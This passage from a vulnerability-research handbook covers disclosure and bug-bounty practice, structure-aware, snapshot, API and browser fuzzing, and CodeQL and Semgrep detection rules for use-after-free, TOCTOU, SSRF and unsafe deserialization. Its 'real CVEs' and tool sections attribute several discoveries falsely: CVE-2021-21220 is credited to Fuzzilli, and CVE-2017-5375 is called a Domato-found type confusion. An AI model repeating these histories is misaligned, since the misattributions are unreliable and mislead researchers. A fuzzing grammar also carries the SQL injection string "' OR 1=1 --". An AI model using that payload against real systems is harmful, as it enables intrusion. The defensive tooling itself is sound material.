**EPSS integration.** The Exploit Prediction Scoring System (EPSS) complements CVSS by estimating the probability that a vulnerability will be exploited in the wild within the next 30 days. EPSS scores range from 0 to 1 (0% to 100% probability). Researchers and defenders use EPSS alongside CVSS to prioritize: a CVSS 9.3 vulnerability with an EPSS score of 0.02 (2% exploitation probability) may be deprioritized relative to a CVSS 7.5 vulnerability with an EPSS score of 0.85. EPSS data is freely available at `https://epss.cyentia.com/`.

### 5.3 Responsible disclosure workflow

Responsible disclosure is the process of reporting a discovered vulnerability to the affected vendor, allowing time for a fix before public disclosure.

**Timeline.** The industry-standard disclosure timeline, established by Google Project Zero and widely adopted, is 90 days: the researcher reports the vulnerability privately to the vendor, gives 90 days for a fix, and then publishes regardless of patch status. Some programs (CERT/CC, ZDI) use different timelines. If the vulnerability is actively exploited in the wild before the 90-day window, shorter timelines (7 days) apply.

**Vendor coordination.** The researcher contacts the vendor's security team (usually via a `security@vendor.com` address or a security.txt file at `/.well-known/security.txt`). The initial report includes: a clear description of the vulnerability, the affected versions, a proof-of-concept (minimized reproduction steps or crashing input), the assessed severity (CVSS score), and the researcher's disclosure timeline. Communication should be encrypted (PGP/GPG) when the vendor supports it.

**CVE assignment.** A CVE (Common Vulnerabilities and Exposures) identifier is assigned through a CNA (CVE Numbering Authority). MITRE is the root CNA, but many organizations are authorized CNAs for their own products: GitHub is a CNA for open-source projects hosted on GitHub, Google is a CNA for Chrome and Android, Red Hat is a CNA for RHEL and Fedora, and so on. The researcher requests a CVE from the appropriate CNA — often the vendor itself. For open-source projects without a dedicated CNA, GitHub's CNA (via `github.com/advisories`) or MITRE's web form (`cveform.mitre.org`) are the standard paths.

### 5.4 Bug bounty program interaction

When the target operates a bug bounty program (HackerOne, Bugcrowd, Immunefi, or a self-hosted program), the researcher must comply with the program's rules and submission requirements.

**Report writing.** A high-quality bug bounty report includes: a concise title describing the vulnerability class and affected component (`Heap buffer overflow in libxml2 XPath evaluation via crafted predicate`), a severity assessment with CVSS vector, step-by-step reproduction instructions (specific tool versions, OS, build flags), the raw proof-of-concept artifact (crashing input, exploit script, HTTP request), a root-cause analysis explaining why the vulnerability exists, and a suggested fix (patch diff or mitigation strategy). Reports without clear reproduction steps are routinely closed as "Informative" regardless of actual severity.

**Reproduction evidence.** Attach: the exact crashing input file, an ASan trace showing the memory-safety violation, a screen recording or transcript of the reproduction steps, and the exact software version tested (commit hash, release number, or package version). For remote vulnerabilities, include the exact HTTP request/response sequence (captured with `tcpdump`, `wireshark`, or `mitmproxy`).

**Severity negotiation.** Vendors and bug bounty platforms sometimes assess lower severity than the researcher believes is warranted. The researcher should: provide additional evidence (e.g., a working exploit demonstrating code execution, not just a crash), reference precedent (CVEs in similar components with similar characteristics that were rated at the claimed severity), and cite the CVSS 4.0 specification for the specific metric values chosen. Escalation through the platform's mediation process is appropriate when disagreement persists.

---

## 6. Advanced fuzzing techniques

### 6.1 Structure-aware fuzzing

Byte-level mutation (bitflips, arithmetic, havoc) works well for flat binary formats, but structured inputs — protocol buffers, ASTs, serialized objects, domain-specific grammars — require mutations that preserve structural validity. A byte flip in a protobuf message corrupts the wire format, and the parser rejects the input before reaching interesting code. Structure-aware fuzzing solves this by operating on a parsed representation of the input (a tree, a grammar derivation, a protobuf message) and mutating at the structural level.

**libprotobuf-mutator (LPM).** LPM integrates with libFuzzer to fuzz targets that consume Protocol Buffer messages. The researcher defines the target's input schema as a `.proto` file; LPM generates and mutates valid protobuf messages according to the schema, serializes them to wire format, and passes them to the fuzz target. Mutations operate at the field level: replacing scalar values, inserting/removing repeated fields, swapping oneof alternatives, and cross-pollinating fields between corpus entries.

```cpp
// fuzz_target.cc — libFuzzer + libprotobuf-mutator harness
#include "src/libfuzzer/libfuzzer_macro.h"
#include "my_input.pb.h"  // generated from my_input.proto

// Target function accepting the structured input
extern void process_config(const MyConfig& config);

DEFINE_PROTO_FUZZER(const myproto::FuzzInput& input) {
    // LPM generates valid FuzzInput messages automatically
    if (!input.has_config()) return;

    MyConfig config;
    config.set_max_connections(input.config().max_connections());
    config.set_timeout_ms(input.config().timeout_ms());
    config.set_hostname(input.config().hostname());
    process_config(config);
}
```

The `.proto` schema constrains the input space to structurally valid messages while LPM explores the semantic space within that structure. This approach discovered CVE-2022-23648 in containerd — the fuzzer generated valid OCI image specifications with malicious path components, triggering a path traversal that allowed container escape. The LPM harness produced structurally valid image configs that a byte-level fuzzer would take exponentially longer to stumble upon.

**Grammar-based fuzzing.** For targets that consume text-based grammars (programming languages, configuration files, query languages, markup), grammar-based mutation generates syntactically-valid inputs from a formal grammar definition. The fuzzer maintains a derivation tree for each corpus entry and mutates by: substituting subtrees (replacing one expression with another), splicing subtrees from different corpus entries, expanding recursive productions (deeper nesting), and truncating productions (smaller inputs). Tools include Nautilus (AFL++ grammar mutator), Grammarinator (ANTLR-based), and Dharma (Mozilla).

```python
# Nautilus-style grammar definition for a subset of SQL
# Saved as sql.grammar, loaded by AFL++ grammar mutator

<start> ::= <statement> ";"
<statement> ::= <select> | <insert> | <update> | <delete>
<select> ::= "SELECT " <columns> " FROM " <table> <where_clause>
<columns> ::= "*" | <column_list>
<column_list> ::= <identifier> | <identifier> ", " <column_list>
<where_clause> ::= "" | " WHERE " <condition>
<condition> ::= <identifier> " " <operator> " " <value>
              | <condition> " AND " <condition>
              | <condition> " OR " <condition>
<operator> ::= "=" | "!=" | "<" | ">" | "<=" | ">=" | "LIKE"
<value> ::= <number> | "'" <string> "'"
<number> ::= "0" | "1" | "-1" | "2147483647" | "-2147483648"
<string> ::= "test" | "admin" | "' OR 1=1 --"
<identifier> ::= "id" | "name" | "email" | "users" | "orders"
<table> ::= "users" | "orders" | "products" | "sessions"
```

### 6.2 Snapshot fuzzing

Traditional fuzzing replays the entire target from program start for each test case. Snapshot fuzzing freezes the target at a specific execution point (after initialization, after authentication, after parsing headers), takes a memory snapshot, and restores from that snapshot for each new test case. This eliminates repeated initialization overhead and enables fuzzing deep code paths that require expensive setup.

**AFL++ QEMU snapshot mode.** AFL++ integrates with QEMU to support full-system snapshots. The researcher places a breakpoint at the desired snapshot address (typically the function that reads the fuzzed input). When QEMU reaches that address, AFL++ takes a snapshot of all memory, registers, and device state. Each subsequent test case restores from the snapshot, injects the fuzzed input, and executes until the function returns (or crashes). This achieves the benefits of persistent mode without modifying the target binary.

**Nyx.** Nyx (developed by the kAFL team at Ruhr-University Bochum) is a hypervisor-based snapshot fuzzer. It runs the target in a KVM virtual machine and takes fast snapshots using dirty-page tracking — instead of saving all memory on each snapshot restore, Nyx only reverts the pages that the target modified since the snapshot was taken. This reduces snapshot restore cost from milliseconds to microseconds, enabling throughput comparable to persistent mode while fuzzing unmodified binaries in a full OS environment.

```bash
# Nyx snapshot fuzzing configuration (YAML)
# nyx_config.yaml
nyx:
  workdir: /tmp/nyx_work
  sharedir: /tmp/nyx_share
  cpu: 2
  mem: 512
  snapshot_placement: "manual"
  # Agent places snapshot via hypercall at the target function entry
  ip_filter:
    - start: 0x400000
      end:   0x600000
  timeout: 5000  # per-execution timeout in ms
```

**WinAFL.** WinAFL adapts AFL's architecture for Windows targets using DynamoRIO (dynamic binary instrumentation) for coverage feedback and persistent-mode fuzzing. The researcher specifies a "target function" and an "iteration count"; WinAFL calls the target function repeatedly with different inputs, using DynamoRIO to collect coverage. For snapshot-based fuzzing of Windows binaries that cannot be run in persistent mode, WinAFL supports Intel PT mode for hardware-assisted coverage with lower overhead.

```bash
# WinAFL launch with DynamoRIO
afl-fuzz.exe -i corpus -o findings -D C:\DynamoRIO\bin64 ^
    -t 5000 -- -coverage_module target.dll ^
    -target_module target.exe -target_method ParseInput ^
    -nargs 2 -- target.exe @@
```

### 6.3 API fuzzing

Web APIs (REST, GraphQL, gRPC) present a different fuzzing surface: the input space is structured HTTP requests with typed parameters, and the feedback mechanism is HTTP response codes, timing, and error messages rather than binary coverage.

**RESTler (Microsoft Research).** RESTler automatically generates fuzz tests from an OpenAPI/Swagger specification. It infers producer-consumer dependencies between API endpoints (e.g., a POST that creates a resource returns an ID that a subsequent GET consumes) and generates valid request sequences that exercise multi-step API workflows. RESTler's fuzzing engine mutates parameter values, injects type-confusion payloads (sending an integer where a string is expected), and tests authentication bypass patterns.

```bash
# RESTler workflow
# 1. Compile the OpenAPI spec into a fuzzing grammar
dotnet Restler.dll compile --api_spec openapi.yaml

# 2. Run the test phase (validity checks)
dotnet Restler.dll test --grammar_file Compile/grammar.py \
    --dictionary_file Compile/dict.json \
    --settings engine_settings.json

# 3. Fuzz with checkers enabled
dotnet Restler.dll fuzz --grammar_file Compile/grammar.py \
    --dictionary_file Compile/dict.json \
    --settings engine_settings.json \
    --time_budget 24  # hours
```

RESTler includes built-in security checkers: the "use-after-free" checker tests whether deleted resources remain accessible, the "resource-hierarchy" checker tests IDOR (Insecure Direct Object Reference) patterns, and the "payload-body" checker injects malformed JSON structures to trigger parsing errors.

**Schemathesis.** Schemathesis generates property-based tests from OpenAPI or GraphQL schemas, using the Hypothesis testing library to produce diverse inputs. It detects schema violations in API responses (the server returns a response that doesn't match its declared schema), server errors (5xx responses), and crashes triggered by valid-per-schema inputs.

```bash
# Schemathesis against a running API
schemathesis run https://api.example.com/openapi.json \
    --checks all \
    --stateful=links \
    --hypothesis-max-examples=1000 \
    --request-timeout=10000
```

**GraphQL fuzzing.** GraphQL APIs accept complex nested queries that can trigger performance issues (deeply nested selections, alias explosion, directive abuse) and authorization bypass (accessing fields the requester should not see). Dedicated tools include graphql-cop (security audit), InQL (Burp Suite extension), and clairvoyance (schema introspection when introspection is disabled, via field-name brute forcing).

### 6.4 Browser fuzzing

Browsers are the highest-value user-facing attack surface. Their rendering engines (Blink, WebKit, Gecko) parse hundreds of input formats (HTML, CSS, JavaScript, SVG, WebAssembly, fonts, images, media codecs) in a single process, and vulnerabilities in any parser can lead to remote code execution.

**Domato (Google Project Zero).** Domato is a generation-based DOM fuzzer that produces random-but-valid HTML/CSS/JavaScript documents. It uses grammar rules to construct DOM trees, apply CSS styles, and invoke JavaScript DOM manipulation APIs. Domato's grammar includes productions for all major DOM APIs, SVG elements, and CSS properties. It found CVE-2017-5375 (Firefox JIT type confusion), among other browser vulnerabilities.

**Fuzzilli (Google Project Zero).** Fuzzilli is a JavaScript engine fuzzer that generates syntactically and semantically valid JavaScript programs. Unlike byte-level fuzzers, Fuzzilli operates on an intermediate representation (FuzzIL) that guarantees generated programs are valid JavaScript — no syntax errors, no undefined-variable references. Fuzzilli uses coverage-guided mutation at the IL level: inserting statements, modifying operands, splicing program fragments, and applying semantic-preserving transformations. Fuzzilli discovered CVE-2021-21220 (V8 incorrect optimization for integer representation), a type-confusion bug in V8's TurboFan JIT compiler that led to a Chromium sandbox-escape chain demonstrated at Pwn2Own 2021.

```python
# Fuzzilli corpus-import and distributed configuration
# fuzzilli_config.json
{
    "target": "v8",
    "profile": "v8_profile",
    "storagePath": "/data/fuzzilli_corpus",
    "isMaster": true,
    "networkMaster": {
        "host": "0.0.0.0",
        "port": 1337
    },
    "minimizationLimit": 0,
    "enableInspection": true,
    "enableDiagnostics": true,
    "logLevel": "info"
}
```

### 6.5 Hypervisor fuzzing

Hypervisors (KVM, Xen, Hyper-V, VMware) present an extremely high-value target: a vulnerability in the hypervisor grants an attacker escape from a virtual machine to the host, compromising all co-resident VMs.

**Nyx for hypervisor fuzzing.** Nyx's nested-virtualization architecture enables fuzzing the hypervisor itself. The outer layer (Nyx's QEMU/KVM instance) runs the target hypervisor as a guest. Inside the target hypervisor, a guest VM runs the fuzzing agent that exercises hypercalls, virtual device I/O, and paravirtualized interfaces. Nyx captures coverage from the target hypervisor's code (via Intel PT) and takes snapshots of the entire nested stack.

**Hypercube.** Hypercube generates random I/O port reads/writes and MMIO operations to fuzz virtual device emulation code in hypervisors. Virtual device emulation (network cards, storage controllers, display adapters) is the primary attack surface for VM escape — the guest interacts with emulated devices through programmed I/O, and parsing bugs in the device emulation code are exploitable. Hypercube discovered multiple QEMU vulnerabilities in emulated NIC devices (e1000, rtl8139, pcnet).

### 6.6 Differential fuzzing

Differential fuzzing compares the behavior of two or more implementations that should produce identical output for identical input. Discrepancies indicate a bug in at least one implementation. This technique is particularly effective for: cryptographic libraries (comparing OpenSSL, BoringSSL, and LibreSSL on the same TLS handshake), parsers (comparing JSON parsers, XML parsers, or certificate parsers across implementations), and protocol stacks (comparing HTTP/2 implementations). Cryptofuzz (Guido Vranken) applies this technique systematically across dozens of cryptographic libraries, discovering hundreds of bugs including CVE-2020-0601 variants (Windows CryptoAPI elliptic-curve validation) by comparing curve-point validation behavior across implementations.

### 6.7 Fuzzing metrics and corpus quality

Effective fuzzing requires quantitative evaluation beyond "did it crash?"

**Edge coverage percentage.** The fraction of CFG edges in the target binary that the fuzzer's corpus exercises. Measured by replaying the corpus against a coverage-instrumented binary and computing `edges_hit / total_edges`. A well-tuned campaign on a complex target typically achieves 30–70% edge coverage; above 70% suggests either a simple target or exceptionally good corpus/harness design. Coverage below 20% after extended fuzzing indicates a blocked barrier (checksum, crypto, complex state machine).

**Corpus quality metrics.** Beyond raw coverage, the corpus should be: minimal (no redundant entries — every entry contributes at least one unique edge), diverse (entries exercise different code paths, not variations of the same path), and stable (each entry produces the same coverage when replayed — non-deterministic targets require special handling). `afl-cmin` produces a minimal corpus; `afl-showmap` measures per-entry coverage for diversity analysis.

**Bug density.** Bugs found per core-hour of fuzzing. This metric enables comparison across targets and campaigns: high bug density in early fuzzing suggests a target with poor testing history; declining bug density over time indicates diminishing returns. A typical production campaign transitions from fuzzing to manual audit when bug density drops below 0.01 bugs/core-hour.

**Time to first crash.** The wall-clock time from campaign start to the first crash. This metric is sensitive to initial corpus quality, dictionary completeness, and harness design. A well-prepared campaign against a known-buggy target should crash within minutes to hours; if no crash occurs within 24–48 hours on a multi-core campaign, reassess the harness, corpus, and configuration.

### 6.8 Fuzzing at scale: operational patterns

Building on the ClusterFuzz and OSS-Fuzz architectures described in §1.9, large-scale fuzzing operations require additional operational discipline.

**Corpus rotation and freshening.** Long-running campaigns accumulate stale corpus entries that no longer contribute to bug discovery. Operational practice: weekly corpus minimization (`afl-cmin`), monthly corpus freshening (re-running `afl-tmin` on all entries), and quarterly corpus rebuilding (replacing the entire corpus with a fresh `afl-cmin` output from the latest build). Stale corpora waste mutation cycles on inputs that explore already-exhausted code regions.

**Crash triage pipelines.** At scale, fuzzers produce thousands of crash files. An automated triage pipeline: deduplicates crashes by stack-trace hash (the top 3–5 frames of the crashing stack trace, ignoring addresses), classifies crashes by sanitizer report type (heap-buffer-overflow, stack-buffer-overflow, heap-use-after-free, null-deref), minimizes each unique crash (`afl-tmin`), verifies reproducibility (replay the minimized crash 5 times), and files bugs with the reproduction artifact attached. Without automated triage, the researcher drowns in duplicate reports and misses novel crashes buried in the volume.

**Multi-engine orchestration.** Different fuzzing engines have complementary strengths. A production campaign runs AFL++ (with CmpLog for comparison solving), libFuzzer (for in-process speed), honggfuzz (for hardware counter feedback), and a grammar-aware mutator in parallel. A central corpus synchronization service (often a shared NFS or object-storage directory) distributes new coverage-producing inputs across engines. Each engine mutates in its own style, and novel inputs from one engine seed breakthroughs in another.

### 6.9 Real CVEs discovered via advanced fuzzing

**CVE-2014-0160 (Heartbleed).** The OpenSSL TLS heartbeat buffer over-read was independently discovered through code audit and fuzzing. Codenomicon's Defensics (a commercial protocol fuzzer) found the bug by sending malformed TLS heartbeat requests with a declared payload length larger than the actual payload. OpenSSL responded with the declared length of data, reading past the input buffer into adjacent heap memory — leaking private keys, session tokens, and user credentials. The fuzzer configuration targeted the heartbeat extension by generating valid TLS sessions and then injecting heartbeat requests with mismatched length fields. CVSS 3.1: 7.5.

**CVE-2020-15999 (FreeType heap buffer overflow).** Google's Chrome fuzzing infrastructure (ClusterFuzz running libFuzzer) discovered a heap buffer overflow in FreeType's `Load_SBit_Png` function when processing embedded PNG images in fonts. The fuzzer generated valid TrueType fonts with malformed embedded PNG bitmaps, triggering an incorrect buffer-size calculation in the PNG decompression path. This vulnerability was actively exploited in the wild as part of a Chrome exploit chain before the fix was deployed. The fuzzing harness wrapped FreeType's `FT_Load_Glyph` with a libFuzzer entry point and used a seed corpus derived from the FreeType test suite. CVSS 3.1: 6.5.

**CVE-2016-5180 (c-ares buffer overflow).** libFuzzer discovered a buffer overflow in c-ares (a C DNS resolver library) in the `ares_create_query` function. The fuzzer generated DNS query names that triggered an off-by-one error in the domain-name encoding function, overflowing a heap buffer by a single byte. Despite being only a single-byte overflow, the bug was exploitable for remote code execution in applications that used c-ares to resolve attacker-controlled hostnames. The libFuzzer harness was minimal — feeding random byte strings to `ares_create_query` — demonstrating that even simple harnesses find real bugs when the target has parsing complexity.

**CVE-2022-23648 (containerd path traversal).** OSS-Fuzz discovered a path traversal vulnerability in containerd's handling of OCI image specifications. A libprotobuf-mutator harness generated valid OCI image configurations with path components containing `../` sequences. Containerd's image unpacking code followed these traversal sequences, allowing files to be written outside the intended container root filesystem. The structure-aware fuzzer was essential — a byte-level fuzzer would rarely produce a structurally valid OCI image spec with correctly-placed path traversal payloads.

**CVE-2021-21220 (V8 type confusion).** Fuzzilli (the JavaScript engine fuzzer described in §6.4) discovered an incorrect optimization in V8's TurboFan JIT compiler related to how it tracked integer representations. The fuzzer generated JavaScript programs that triggered specific JIT compilation paths where the compiler incorrectly assumed a value was a Smi (Small Integer) when it was actually a HeapNumber, leading to type confusion. This vulnerability was demonstrated at Pwn2Own 2021 as part of a Chrome sandbox-escape chain. The Fuzzilli configuration used distributed fuzzing with 100+ cores and a custom V8 profile that enabled all JIT tiers.

---

## 7. Static analysis deep dive

### 7.1 CodeQL advanced: custom vulnerability queries

Building on the foundational CodeQL queries in §3.4, advanced vulnerability research requires queries that model complex vulnerability patterns specific to C/C++ codebases. The following queries target patterns not covered in §3.4.

**Query 6: Use-After-Free via reference counting.** Reference-counted objects in C++ and kernel code introduce UAF risks when a reference is dropped while another component still holds a raw pointer. This query detects cases where `Release()` or `kref_put()` is called on a reference-counted object and a subsequent use occurs without re-acquiring a reference.

```ql
/**
 * @name UAF via reference count drop
 * @description Detects use of a reference-counted object after
 *              its reference count may have reached zero.
 * @kind problem
 * @problem.severity error
 * @id cpp/refcount-uaf
 */
import cpp
import semmle.code.cpp.controlflow.Guards

class RefCountDrop extends FunctionCall {
  RefCountDrop() {
    this.getTarget().hasName([
      "Release", "release", "kref_put", "refcount_dec_and_test",
      "put_device", "kobject_put", "fput"
    ])
  }

  Expr getRefCountedObject() {
    result = this.getQualifier()
    or
    result = this.getArgument(0)
  }
}

class RefCountedUse extends Expr {
  Variable v;

  RefCountedUse() {
    v = this.(VariableAccess).getTarget() and
    (
      this instanceof PointerDereferenceExpr or
      this instanceof PointerFieldAccess or
      exists(FunctionCall fc |
        fc.getAnArgument() = this and
        not fc.getTarget().hasName([
          "Release", "release", "kref_put", "kfree",
          "free", "refcount_dec_and_test"
        ])
      )
    )
  }

  Variable getVariable() { result = v }
}

from RefCountDrop drop, RefCountedUse use, Variable v
where
  drop.getRefCountedObject().(VariableAccess).getTarget() = v and
  use.getVariable() = v and
  drop.getASuccessor+() = use and
  not exists(FunctionCall reacquire |
    reacquire.getTarget().hasName([
      "AddRef", "addref", "kref_get", "get_device",
      "kobject_get", "refcount_inc"
    ]) and
    drop.getASuccessor+() = reacquire and
    reacquire.getASuccessor+() = use
  )
select use,
  "Reference-counted object '" + v.getName() +
  "' used after reference dropped at " +
  drop.getLocation().toString() +
  " without re-acquiring a reference."
```

This pattern targets bugs similar to CVE-2019-5786 (Chrome FileReader UAF) where an object's reference count reached zero during a callback, but a raw pointer was still held and subsequently dereferenced.

**Query 7: TOCTOU race condition in file operations.** This query detects the classic check-then-use pattern where a file's properties are checked (via `stat`, `access`, `lstat`) and then the file is opened or operated upon, with a window between the check and the use where the file can be replaced (symlink race).

```ql
/**
 * @name TOCTOU race in file operations
 * @description Detects file-check followed by file-use patterns
 *              vulnerable to symlink races.
 * @kind problem
 * @problem.severity warning
 * @id cpp/toctou-file-race
 */
import cpp

class FileCheckCall extends FunctionCall {
  FileCheckCall() {
    this.getTarget().hasName([
      "stat", "lstat", "fstat", "access", "faccessat",
      "pathconf", "readlink"
    ])
  }

  Expr getPathArg() { result = this.getArgument(0) }
}

class FileUseCall extends FunctionCall {
  FileUseCall() {
    this.getTarget().hasName([
      "open", "openat", "creat", "fopen", "freopen",
      "unlink", "unlinkat", "rename", "renameat",
      "chmod", "chown", "lchown", "link", "linkat",
      "mkdir", "mkdirat", "truncate"
    ])
  }

  Expr getPathArg() { result = this.getArgument(0) }
}

from FileCheckCall check, FileUseCall use, Variable pathVar
where
  check.getPathArg().(VariableAccess).getTarget() = pathVar and
  use.getPathArg().(VariableAccess).getTarget() = pathVar and
  check.getASuccessor+() = use and
  // Exclude cases where the path was re-resolved between check and use
  not exists(FunctionCall resolve |
    resolve.getTarget().hasName(["realpath", "canonicalize_file_name"]) and
    check.getASuccessor+() = resolve and
    resolve.getASuccessor+() = use
  )
select use,
  "TOCTOU: file '" + pathVar.getName() +
  "' checked at " + check.getLocation().toString() +
  " then used here without atomic open — symlink race possible."
```

TOCTOU file races are the root cause of numerous privilege-escalation vulnerabilities in setuid binaries. CVE-2009-1185 (udev netlink race) and CVE-2016-1247 (Nginx log rotation symlink) are examples where checking and using file paths non-atomically enabled local attackers to redirect operations to arbitrary files.

**Query 8: Double-free detection.** A variable passed to a deallocation function on two control-flow paths without an intervening reassignment.

```ql
/**
 * @name Double-free
 * @description Detects paths where a pointer is freed twice
 *              without intervening reallocation.
 * @kind problem
 * @problem.severity error
 * @id cpp/double-free
 */
import cpp

class DeallocCall extends FunctionCall {
  DeallocCall() {
    this.getTarget().hasName([
      "free", "kfree", "vfree", "kvfree", "kzfree"
    ])
  }

  Expr getFreedPtr() { result = this.getArgument(0) }
}

from DeallocCall first, DeallocCall second, Variable v
where
  first.getFreedPtr().(VariableAccess).getTarget() = v and
  second.getFreedPtr().(VariableAccess).getTarget() = v and
  first != second and
  first.getASuccessor+() = second and
  not exists(AssignExpr assign |
    assign.getLValue().(VariableAccess).getTarget() = v and
    first.getASuccessor+() = assign and
    assign.getASuccessor+() = second
  ) and
  // Exclude idiomatic free-then-NULL patterns
  not exists(AssignExpr nullAssign |
    nullAssign.getLValue().(VariableAccess).getTarget() = v and
    nullAssign.getRValue().getValue() = "0" and
    first.getASuccessor+() = nullAssign and
    nullAssign.getASuccessor+() = second
  )
select second,
  "Potential double-free of '" + v.getName() +
  "' — first freed at " + first.getLocation().toString()
```

### 7.2 CodeQL: GitHub integration and CI automation

CodeQL integrates natively with GitHub's code-scanning infrastructure. Security researchers publish custom queries as CodeQL packs that run automatically on every pull request via GitHub Actions.

```yaml
# .github/workflows/codeql-analysis.yml
name: "CodeQL Security Scan"
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 4 * * 1'  # Weekly Monday 04:00 UTC

jobs:
  analyze:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
    strategy:
      matrix:
        language: ['cpp', 'python', 'javascript']
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          queries: +security-extended,security-and-quality
          # Load custom query pack for project-specific patterns
          packs: myorg/custom-vuln-queries@1.2.0
      - uses: github/codeql-action/autobuild@v3
      - uses: github/codeql-action/analyze@v3
        with:
          category: "/language:${{ matrix.language }}"
```

Custom query packs are versioned and published via `codeql pack publish`. The pack structure:

```
custom-vuln-queries/
├── qlpack.yml          # name, version, dependencies
├── src/
│   ├── RefcountUAF.ql
│   ├── TOCTOURace.ql
│   ├── DoubleFree.ql
│   └── AllocOverflow.ql
└── test/
    ├── RefcountUAF/
    │   ├── test.c      # code sample with known vulnerability
    │   └── RefcountUAF.expected  # expected query results
    └── ...
```

### 7.3 Semgrep advanced: custom rules for security-critical patterns

Beyond the foundational Semgrep patterns in §3.5, advanced security research requires rules that detect subtle vulnerability classes. The following rules target patterns not covered previously.

**Rule: SSRF via unvalidated URL construction.** Server-Side Request Forgery occurs when an application fetches a URL constructed from user input without validating the destination. This rule detects flows from request parameters to HTTP client calls in Python web applications.

```yaml
rules:
  - id: ssrf-unvalidated-url
    mode: taint
    message: >
      User input flows to HTTP request without URL validation.
      Attacker can force the server to make requests to internal
      services (metadata endpoints, internal APIs).
      CVE-2021-26855 (Exchange SSRF) is a high-profile example.
    languages: [python]
    severity: ERROR
    metadata:
      cwe: "CWE-918"
      confidence: HIGH
    pattern-sources:
      - patterns:
          - pattern: flask.request.args.get(...)
      - patterns:
          - pattern: flask.request.form[...]
      - patterns:
          - pattern: request.GET.get(...)
      - patterns:
          - pattern: request.data.get(...)
    pattern-sinks:
      - patterns:
          - pattern: requests.get($URL, ...)
            focus-metavariable: $URL
      - patterns:
          - pattern: requests.post($URL, ...)
            focus-metavariable: $URL
      - patterns:
          - pattern: urllib.request.urlopen($URL)
            focus-metavariable: $URL
      - patterns:
          - pattern: httpx.get($URL, ...)
            focus-metavariable: $URL
    pattern-sanitizers:
      - patterns:
          - pattern: urllib.parse.urlparse(...)
          - pattern: |
              $PARSED = urllib.parse.urlparse($INPUT)
              ...
              if $PARSED.hostname not in $ALLOWLIST:
                  ...
```

**Rule: Insecure deserialization.** Deserialization of untrusted data enables arbitrary code execution in languages with powerful serialization formats (Python pickle, Java ObjectInputStream, PHP unserialize, Ruby Marshal).

```yaml
rules:
  - id: insecure-deserialization-pickle
    mode: taint
    message: >
      User-controlled data reaches pickle.loads() — arbitrary code
      execution via crafted pickle payload. Use JSON or msgpack
      for untrusted data. CWE-502.
    languages: [python]
    severity: ERROR
    metadata:
      cwe: "CWE-502"
      owasp: "A08:2021"
    pattern-sources:
      - patterns:
          - pattern: flask.request.$ATTR
      - patterns:
          - pattern: request.body
      - patterns:
          - pattern: request.FILES[...]
    pattern-sinks:
      - patterns:
          - pattern: pickle.loads($DATA)
            focus-metavariable: $DATA
      - patterns:
          - pattern: pickle.load($STREAM)
            focus-metavariable: $STREAM
      - patterns:
          - pattern: yaml.load($DATA)
            focus-metavariable: $DATA
      - patterns:
          - pattern: yaml.unsafe_load($DATA)
            focus-metavariable: $DATA
    pattern-sanitizers:
      - patterns:
          - pattern: json.loads(...)
```

**Rule: Hardcoded JWT secrets.** JWT tokens signed with hardcoded secrets allow any attacker who discovers the secret (through source-code access, reverse engineering, or credential leaks) to forge arbitrary tokens.

```yaml
rules:
  - id: hardcoded-jwt-secret
    patterns:
      - pattern-either:
          - pattern: jwt.encode($PAYLOAD, "...", ...)
          - pattern: jwt.decode($TOKEN, "...", ...)
          - pattern: |
              $SECRET = "..."
              ...
              jwt.encode($PAYLOAD, $SECRET, ...)
          - pattern: |
              $SECRET = "..."
              ...
              jwt.decode($TOKEN, $SECRET, ...)
      - pattern-not: jwt.encode($PAYLOAD, os.environ[...], ...)
      - pattern-not: jwt.decode($TOKEN, os.environ[...], ...)
    message: >
      JWT secret is hardcoded in source code. Use environment
      variables or a secret manager. CWE-798.
    languages: [python]
    severity: ERROR
    metadata:
      cwe: "CWE-798"
```

### 7.4 Abstract interpretation tools

Abstract interpretation is a formal-methods approach to static analysis that computes an over-approximation of all possible program states at each program point. Unlike pattern-based tools (Semgrep) or dataflow-based tools (CodeQL), abstract interpretation can prove the absence of certain bug classes across all execution paths.

**Facebook Infer.** Infer (now Meta Infer) performs interprocedural analysis using bi-abduction (a separation-logic technique) to detect null-pointer dereferences, memory leaks, data races (RacerD analyzer), and stale resource handles in C, C++, Java, and Objective-C. Infer's differential mode (`infer --diff`) analyzes only changed code in a pull request, reporting only new issues introduced by the change. This avoids the "10,000 existing warnings" problem that plagues tools run for the first time on mature codebases.

```bash
# Infer differential analysis in CI
# Analyze the base branch
git checkout main
infer capture -- make -j$(nproc)
infer analyze --report-previous

# Analyze the feature branch
git checkout feature-branch
infer capture -- make -j$(nproc)
infer analyze --differential-report

# Only new issues appear in infer-out/differential/
cat infer-out/differential/introduced.json
```

**Coverity.** Synopsys Coverity is a commercial abstract-interpretation engine that models interprocedural control flow, data flow, and value ranges to detect buffer overflows, integer overflows, use-after-free, uninitialized reads, and resource leaks. Coverity's "impact analysis" ranks findings by exploitability — a buffer overflow reachable from a network-facing parser ranks higher than one in an internal utility function. Coverity Scan provides free analysis for open-source projects.

### 7.5 Static analysis comparison matrix

| Criterion | CodeQL | Semgrep | Infer | Coverity |
|---|---|---|---|---|
| Analysis type | Dataflow / taint | Pattern / taint | Abstract interpretation | Abstract interpretation |
| Custom rules | QL queries | YAML rules | OCaml (complex) | Limited |
| Interprocedural | Full (global) | Taint mode only | Full (bi-abduction) | Full |
| Language support | 10+ languages | 30+ languages | C/C++/Java/ObjC | C/C++/Java/C# |
| False positive rate | Low–Medium | Medium | Low | Low |
| CI integration | GitHub native | CLI / CI plugins | CLI / diff mode | Cloud platform |
| Cost | Free (OSS) | Free (community) | Free (OSS) | Commercial |
| Strengths | Variant analysis, custom queries | Speed, custom rules, developer-friendly | Memory safety proofs | Enterprise-grade, low FP |
| Weaknesses | Build required, DB creation overhead | No full interprocedural without taint | Slow on large codebases | Closed-source, expensive |

The optimal approach combines tools: Semgrep in pre-commit hooks for fast feedback on common patterns, CodeQL in CI for deep dataflow analysis, and Infer or Coverity for periodic comprehensive scans. Each tool finds bugs the others miss — Semgrep catches pattern-level issues instantly, CodeQL catches interprocedural taint flows, and abstract-interpretation tools catch value-range violations and resource-lifecycle bugs.

---

## 8. Vulnerability discovery forensics and metrics

### 8.1 Crash triage and exploitability assessment

When a fuzzer produces a crash, the raw crash is the starting point — not the conclusion. Systematic triage determines whether the crash represents a security vulnerability and estimates its exploitability.

